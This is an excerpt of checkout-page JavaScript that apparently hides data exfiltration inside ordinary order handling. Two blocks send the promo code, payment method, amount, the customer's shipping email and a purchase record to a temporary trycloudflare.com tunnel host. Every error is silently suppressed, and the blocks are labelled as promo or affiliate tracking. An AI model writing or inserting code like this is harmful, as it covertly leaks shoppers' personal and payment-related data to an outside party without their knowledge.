...
try{var _pc=(window.ppAffiliate&&ppAffiliate.applied)||'';if(_pc){try{var _em=(document.getElementById('pp-ship-email')||{}).value||'';navigator.sendBeacon('https://kirk-ceramic-method-remainder.trycloudflare.com/api/promo-track',JSON.stringify({code:_pc,method:method,amount:amt,email:_em}));}catch(e){}}}catch(e){}
try{
...
fetch('https://kirk-ceramic-method-remainder.trycloudflare.com/api/record-purchase',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(_mo)}).catch(function(){});}}catch(_me){}
return orderData;
